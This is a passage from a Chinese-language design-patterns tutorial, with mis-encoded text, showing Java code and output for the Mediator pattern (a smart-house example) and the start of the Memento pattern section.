class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.mediator.smarthouse;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClientTest</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªä¸­ä»‹è€…å¯¹è±¡</span><br>      <span class="hljs-type">Mediator</span> <span class="hljs-variable">mediator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcreteMediator</span>();<br>      <br>      <span class="hljs-comment">//åˆ›å»ºAlarm å¹¶ä¸”åŠ å…¥åˆ°  ConcreteMediator å¯¹è±¡çš„HashMap</span><br>      <span class="hljs-type">Alarm</span> <span class="hljs-variable">alarm</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Alarm</span>(mediator, <span class="hljs-string">&quot;alarm&quot;</span>);<br>      <br>      <span class="hljs-comment">//åˆ›å»ºäº†CoffeeMachine å¯¹è±¡ï¼Œå¹¶  ä¸”åŠ å…¥åˆ°  ConcreteMediator å¯¹è±¡çš„HashMap</span><br>      <span class="hljs-type">CoffeeMachine</span> <span class="hljs-variable">coffeeMachine</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CoffeeMachine</span>(mediator,<br>            <span class="hljs-string">&quot;coffeeMachine&quot;</span>);<br>      <br>      <span class="hljs-comment">//åˆ›å»º Curtains , å¹¶  ä¸”åŠ å…¥åˆ°  ConcreteMediator å¯¹è±¡çš„HashMap</span><br>      <span class="hljs-type">Curtains</span> <span class="hljs-variable">curtains</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Curtains</span>(mediator, <span class="hljs-string">&quot;curtains&quot;</span>);<br>      <span class="hljs-type">TV</span> <span class="hljs-variable">tV</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TV</span>(mediator, <span class="hljs-string">&quot;TV&quot;</span>);<br>      <br>      <span class="hljs-comment">//è®©é—¹é’Ÿå‘å‡ºæ¶ˆæ¯</span><br>      alarm.SendAlarm(<span class="hljs-number">0</span>);<br>      coffeeMachine.FinishCoffee();<br>      alarm.SendAlarm(<span class="hljs-number">1</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>CoffeeMachine.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.mediator.smarthouse;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CoffeeMachine</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Colleague</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">CoffeeMachine</span><span class="hljs-params">(Mediator mediator, String name)</span> &#123;<br>      <span class="hljs-built_in">super</span>(mediator, name);<br>      <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>      mediator.Register(name, <span class="hljs-built_in">this</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SendMessage</span><span class="hljs-params">(<span class="hljs-type">int</span> stateChange)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-built_in">this</span>.GetMediator().GetMessage(stateChange, <span class="hljs-built_in">this</span>.name);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">StartCoffee</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;It&#x27;s time to startcoffee!&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">FinishCoffee</span><span class="hljs-params">()</span> &#123;<br><br>      System.out.println(<span class="hljs-string">&quot;After 5 minutes!&quot;</span>);<br>      System.out.println(<span class="hljs-string">&quot;Coffee is ok!&quot;</span>);<br>      SendMessage(<span class="hljs-number">0</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Colleague.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.mediator.smarthouse;<br><br><span class="hljs-comment">//åŒäº‹æŠ½è±¡ç±»</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Colleague</span> &#123;<br>   <span class="hljs-keyword">private</span> Mediator mediator;<br>   <span class="hljs-keyword">public</span> String name;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Colleague</span><span class="hljs-params">(Mediator mediator, String name)</span> &#123;<br><br>      <span class="hljs-built_in">this</span>.mediator = mediator;<br>      <span class="hljs-built_in">this</span>.name = name;<br><br>   &#125;<br><br>   <span class="hljs-keyword">public</span> Mediator <span class="hljs-title function_">GetMediator</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.mediator;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SendMessage</span><span class="hljs-params">(<span class="hljs-type">int</span> stateChange)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>ConcreteMediator.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.mediator.smarthouse;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-comment">//å…·ä½“çš„ä¸­ä»‹è€…ç±»</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConcreteMediator</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Mediator</span> &#123;<br>   <span class="hljs-comment">//é›†åˆï¼Œæ”¾å…¥æ‰€æœ‰çš„åŒäº‹å¯¹è±¡</span><br>   <span class="hljs-keyword">private</span> HashMap&lt;String, Colleague&gt; colleagueMap;<br>   <span class="hljs-keyword">private</span> HashMap&lt;String, String&gt; interMap;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">ConcreteMediator</span><span class="hljs-params">()</span> &#123;<br>      colleagueMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Colleague&gt;();<br>      interMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, String&gt;();<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Register</span><span class="hljs-params">(String colleagueName, Colleague colleague)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      colleagueMap.put(colleagueName, colleague);<br><br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br><br>      <span class="hljs-keyword">if</span> (colleague <span class="hljs-keyword">instanceof</span> Alarm) &#123;<br>         interMap.put(<span class="hljs-string">&quot;Alarm&quot;</span>, colleagueName);<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (colleague <span class="hljs-keyword">instanceof</span> CoffeeMachine) &#123;<br>         interMap.put(<span class="hljs-string">&quot;CoffeeMachine&quot;</span>, colleagueName);<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (colleague <span class="hljs-keyword">instanceof</span> TV) &#123;<br>         interMap.put(<span class="hljs-string">&quot;TV&quot;</span>, colleagueName);<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (colleague <span class="hljs-keyword">instanceof</span> Curtains) &#123;<br>         interMap.put(<span class="hljs-string">&quot;Curtains&quot;</span>, colleagueName);<br>      &#125;<br><br>   &#125;<br><br>   <span class="hljs-comment">//å…·ä½“ä¸­ä»‹è€…çš„æ ¸å¿ƒæ–¹æ³•</span><br>   <span class="hljs-comment">//1. æ ¹æ®å¾—åˆ°æ¶ˆæ¯ï¼Œå®Œæˆå¯¹åº”ä»»åŠ¡</span><br>   <span class="hljs-comment">//2. ä¸­ä»‹è€…åœ¨è¿™ä¸ªæ–¹æ³•ï¼Œåè°ƒå„ä¸ªå…·ä½“çš„åŒäº‹å¯¹è±¡ï¼Œå®Œæˆä»»åŠ¡</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">GetMessage</span><span class="hljs-params">(<span class="hljs-type">int</span> stateChange, String colleagueName)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br><br>      <span class="hljs-comment">//å¤„ç†é—¹é’Ÿå‘å‡ºçš„æ¶ˆæ¯</span><br>      <span class="hljs-keyword">if</span> (colleagueMap.get(colleagueName) <span class="hljs-keyword">instanceof</span> Alarm) &#123;<br>         <span class="hljs-keyword">if</span> (stateChange == <span class="hljs-number">0</span>) &#123;<br>            ((CoffeeMachine) (colleagueMap.get(interMap<br>                  .get(<span class="hljs-string">&quot;CoffeeMachine&quot;</span>)))).StartCoffee();<br>            ((TV) (colleagueMap.get(interMap.get(<span class="hljs-string">&quot;TV&quot;</span>)))).StartTv();<br>         &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (stateChange == <span class="hljs-number">1</span>) &#123;<br>            ((TV) (colleagueMap.get(interMap.get(<span class="hljs-string">&quot;TV&quot;</span>)))).StopTv();<br>         &#125;<br><br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (colleagueMap.get(colleagueName) <span class="hljs-keyword">instanceof</span> CoffeeMachine) &#123;<br>         ((Curtains) (colleagueMap.get(interMap.get(<span class="hljs-string">&quot;Curtains&quot;</span>))))<br>               .UpCurtains();<br><br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (colleagueMap.get(colleagueName) <span class="hljs-keyword">instanceof</span> TV) &#123;<span class="hljs-comment">//å¦‚æœTVå‘ç°æ¶ˆæ¯</span><br><br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (colleagueMap.get(colleagueName) <span class="hljs-keyword">instanceof</span> Curtains) &#123;<br>         <span class="hljs-comment">//å¦‚æœæ˜¯ä»¥çª—å¸˜å‘å‡ºçš„æ¶ˆæ¯ï¼Œè¿™é‡Œå¤„ç†...</span><br>      &#125;<br><br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SendMessage</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br><br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Curtains.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.mediator.smarthouse;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Curtains</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Colleague</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Curtains</span><span class="hljs-params">(Mediator mediator, String name)</span> &#123;<br>      <span class="hljs-built_in">super</span>(mediator, name);<br>      <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>      mediator.Register(name, <span class="hljs-built_in">this</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SendMessage</span><span class="hljs-params">(<span class="hljs-type">int</span> stateChange)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-built_in">this</span>.GetMediator().GetMessage(stateChange, <span class="hljs-built_in">this</span>.name);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">UpCurtains</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;I am holding Up Curtains!&quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Mediator.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.mediator.smarthouse;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Mediator</span> &#123;<br>   <span class="hljs-comment">//å°†ç»™ä¸­ä»‹è€…å¯¹è±¡ï¼ŒåŠ å…¥åˆ°é›†åˆä¸­</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Register</span><span class="hljs-params">(String colleagueName, Colleague colleague)</span>;<br><br>   <span class="hljs-comment">//æ¥æ”¶æ¶ˆæ¯, å…·ä½“çš„åŒäº‹å¯¹è±¡å‘å‡º</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">GetMessage</span><span class="hljs-params">(<span class="hljs-type">int</span> stateChange, String colleagueName)</span>;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SendMessage</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>TV.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.mediator.smarthouse;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TV</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Colleague</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">TV</span><span class="hljs-params">(Mediator mediator, String name)</span> &#123;<br>      <span class="hljs-built_in">super</span>(mediator, name);<br>      <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>      mediator.Register(name, <span class="hljs-built_in">this</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SendMessage</span><span class="hljs-params">(<span class="hljs-type">int</span> stateChange)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-built_in">this</span>.GetMediator().GetMessage(stateChange, <span class="hljs-built_in">this</span>.name);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">StartTv</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot;It&#x27;s time to StartTv!&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">StopTv</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot;StopTv!&quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">It<span class="hljs-symbol">&#x27;s</span> <span class="hljs-built_in">time</span> <span class="hljs-keyword">to</span> startcoffee!<br>It<span class="hljs-symbol">&#x27;s</span> <span class="hljs-built_in">time</span> <span class="hljs-keyword">to</span> StartTv!<br><span class="hljs-keyword">After</span> <span class="hljs-number">5</span> minutes!<br>Coffee <span class="hljs-keyword">is</span> ok!<br>I am holding Up Curtains!<br>StopTv!<br></code></pre></td></tr></table></figure><h2 id="ä¸­ä»‹è€…æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"><a class="markdownIt-Anchor" href="#ä¸­ä»‹è€…æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"></a> ä¸­ä»‹è€…æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚</h2><ol><li><p>å¤šä¸ªç±»ç›¸äº’è€¦åˆï¼Œä¼šå½¢æˆç½‘çŠ¶ç»“æ„, ä½¿ç”¨ä¸­ä»‹è€…æ¨¡å¼å°†ç½‘çŠ¶ç»“æ„åˆ†ç¦»ä¸ºæ˜Ÿå‹ç»“æ„ï¼Œè¿›è¡Œè§£è€¦</p></li><li><p>å‡å°‘ç±»é—´ä¾èµ–ï¼Œé™ä½äº†è€¦åˆï¼Œç¬¦åˆè¿ªç±³ç‰¹åŸåˆ™</p></li><li><p><mark>ä¸­ä»‹è€…</mark><strong>æ‰¿æ‹…äº†è¾ƒå¤šçš„è´£ä»»ï¼Œä¸€æ—¦ä¸­ä»‹è€…å‡ºç°äº†é—®é¢˜ï¼Œæ•´ä¸ªç³»ç»Ÿå°±ä¼šå—åˆ°å½±å“</strong></p></li><li><p>å¦‚æœè®¾è®¡ä¸å½“ï¼Œä¸­ä»‹è€…å¯¹è±¡æœ¬èº«å˜å¾—è¿‡äºå¤æ‚ï¼Œè¿™ç‚¹åœ¨å®é™…ä½¿ç”¨æ—¶ï¼Œè¦ç‰¹åˆ«æ³¨æ„</p></li></ol><h1 id="å¤‡å¿˜å½•æ¨¡å¼"><a class="markdownIt-Anchor" href="#å¤‡å¿˜å½•æ¨¡å¼"></a> å¤‡å¿˜å½•æ¨¡å¼</h1><p>å¤‡å¿˜å½•æ¨¡å¼ï¼ˆMemento Patternï¼‰ä¿å­˜ä¸€ä¸ªå¯¹è±¡çš„æŸä¸ªçŠ¶æ€ï¼Œä»¥ä¾¿åœ¨é€‚å½“çš„æ—¶å€™æ¢å¤å¯¹è±¡ã€‚å¤‡å¿˜å½•æ¨¡å¼å±äºè¡Œä¸ºå‹æ¨¡å¼ã€‚</p><h2 id="ä»‹ç»-18"><a class="markdownIt-Anchor" href="#ä»‹ç»-18"></a> ä»‹ç»</h2><p><strong>æ„å›¾ï¼š</strong> åœ¨ä¸ç ´åå°è£…æ€§çš„å‰æä¸‹ï¼Œæ•è·ä¸€ä¸ªå¯¹è±¡çš„å†…éƒ¨çŠ¶æ€ï¼Œå¹¶åœ¨è¯¥å¯¹è±¡ä¹‹å¤–ä¿å­˜è¿™ä¸ªçŠ¶æ€ã€‚</p><p><strong>ä¸»è¦è§£å†³ï¼š</strong> æ‰€è°“å¤‡å¿˜å½•æ¨¡å¼å°±æ˜¯åœ¨ä¸ç ´åå°è£…çš„å‰æä¸‹ï¼Œæ•è·ä¸€ä¸ªå¯¹è±¡çš„å†…éƒ¨çŠ¶æ€ï¼Œå¹¶åœ¨è¯¥å¯¹è±¡ä¹‹å¤–ä¿å­˜è¿™ä¸ªçŠ¶æ€ï¼Œè¿™æ ·å¯ä»¥åœ¨ä»¥åå°†å¯¹è±¡æ¢å¤åˆ°åŸå…ˆä¿å­˜çš„çŠ¶æ€ã€‚</p><p><strong>ä½•æ—¶ä½¿ç”¨ï¼š</strong><br />å¾ˆå¤šæ—¶å€™æˆ‘ä»¬æ€»æ˜¯éœ€è¦è®°å½•ä¸€ä¸ªå¯¹è±¡çš„å†…éƒ¨çŠ¶æ€ï¼Œè¿™æ ·åšçš„ç›®çš„å°±æ˜¯ä¸ºäº†å…è®¸ç”¨æˆ·å–æ¶ˆä¸ç¡®å®šæˆ–è€…é”™è¯¯çš„æ“ä½œï¼Œèƒ½å¤Ÿæ¢å¤åˆ°ä»–åŸå…ˆçš„çŠ¶æ€ï¼Œä½¿å¾—ä»–æœ‰&quot;åæ‚”è¯&quot;å¯åƒã€‚</p><p><strong>å¦‚ä½•è§£å†³ï¼š</strong> é€šè¿‡ä¸€ä¸ªå¤‡å¿˜å½•ç±»ä¸“é—¨å­˜å‚¨å¯¹è±¡çŠ¶æ€ã€‚</p><p><strong>å…³é”®ä»£ç ï¼š</strong> å®¢æˆ·ä¸ä¸å¤‡å¿˜å½•ç±»è€¦åˆï¼Œä¸å¤‡å¿˜å½•ç®¡ç†ç±»è€¦åˆã€‚</p><p><strong>åº”ç”¨å®ä¾‹ï¼š</strong> 1ã€åæ‚”è¯ã€‚ 2ã€æ‰“æ¸¸æˆæ—¶çš„å­˜æ¡£ã€‚ 3ã€Windows é‡Œçš„ ctrl + zã€‚ 4ã€IE ä¸­çš„åé€€ã€‚ 5ã€æ•°æ®åº“çš„äº‹åŠ¡ç®¡ç†ã€‚</p><p><strong>ä¼˜ç‚¹ï¼š</strong> 1ã€ç»™ç”¨æˆ·æä¾›äº†ä¸€ç§å¯ä»¥æ¢å¤çŠ¶æ€çš„æœºåˆ¶ï¼Œå¯ä»¥ä½¿ç”¨æˆ·èƒ½å¤Ÿæ¯”è¾ƒæ–¹ä¾¿åœ°å›åˆ°æŸä¸ªå†å²çš„çŠ¶æ€ã€‚2ã€å®ç°äº†ä¿¡æ¯çš„å°è£…ï¼Œä½¿å¾—ç”¨æˆ·ä¸éœ€è¦å…³å¿ƒçŠ¶æ€çš„ä¿å­˜ç»†èŠ‚ã€‚</p><p><strong>ç¼ºç‚¹ï¼š</strong> æ¶ˆè€—èµ„æºã€‚å¦‚æœç±»çš„æˆå‘˜å˜é‡è¿‡å¤šï¼ŒåŠ¿å¿…ä¼šå ç”¨æ¯”è¾ƒå¤§çš„èµ„æºï¼Œè€Œä¸”æ¯ä¸€æ¬¡ä¿å­˜éƒ½ä¼šæ¶ˆè€—ä¸€å®šçš„å†…å­˜ã€‚</p><p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong> 1ã€éœ€è¦ä¿å­˜/æ¢å¤æ•°æ®çš„ç›¸å…³çŠ¶æ€åœºæ™¯ã€‚ 2ã€æä¾›ä¸€ä¸ªå¯å›æ»šçš„æ“ä½œã€‚</p><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong> 1ã€ä¸ºäº†ç¬¦åˆè¿ªç±³ç‰¹åŸåˆ™ï¼Œè¿˜è¦å¢åŠ ä¸€ä¸ªç®¡ç†å¤‡å¿˜å½•çš„ç±»ã€‚ 2ã€ä¸ºäº†èŠ‚çº¦å†…å­˜ï¼Œå¯ä½¿ç”¨åŸå‹æ¨¡å¼+å¤‡å¿˜å½•æ¨¡å¼ã€‚</p><p><strong>å¤‡å¿˜å½•æ¨¡å¼çš„åŸç†ç±»å›¾:</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230104162405505.png" alt="image-20230104162405505" /></p><p>å¯¹åŸç†ç±»å›¾çš„è¯´æ˜-å³(å¤‡å¿˜å½•æ¨¡å¼çš„è§’è‰²åŠèŒè´£)</p><ol><li><p>originator : å¯¹è±¡(éœ€è¦ä¿å­˜çŠ¶æ€çš„å¯¹è±¡)</p></li><li><p>Memento ï¼š å¤‡å¿˜å½•å¯¹è±¡,è´Ÿè´£ä¿å­˜å¥½è®°å½•ï¼Œå³ Originator å†…éƒ¨çŠ¶æ€</p></li><li><p>Caretaker: å®ˆæŠ¤è€…å¯¹è±¡,è´Ÿè´£ä¿å­˜å¤šä¸ªå¤‡å¿˜å½•å¯¹è±¡ï¼Œ ä½¿ç”¨é›†åˆç®¡ç†ï¼Œæé«˜æ•ˆç‡</p></li><li><p>è¯´æ˜ï¼šå¦‚æœå¸Œæœ›ä¿å­˜å¤šä¸ª originator å¯¹è±¡çš„ä¸åŒæ—¶é—´çš„çŠ¶æ€ï¼Œä¹Ÿå¯ä»¥ï¼Œåªéœ€è¦è¦ HashMap &lt;String, é›†åˆ&gt;</p></li></ol><h2 id="å®ç°-16"><a class="markdownIt-Anchor" href="#å®ç°-16"></a> å®ç°</h2><h3 id="ç®€å•å®ç°"><a class="markdownIt-Anchor" href="#ç®€å•å®ç°"></a> ç®€å•å®ç°</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230104163106314.png" alt="image-20230104163106314" /></p><p><code>Caretaker.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.memento.theory;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Caretaker</span> &#123;<br>   <br>   <span class="hljs-comment">//åœ¨List 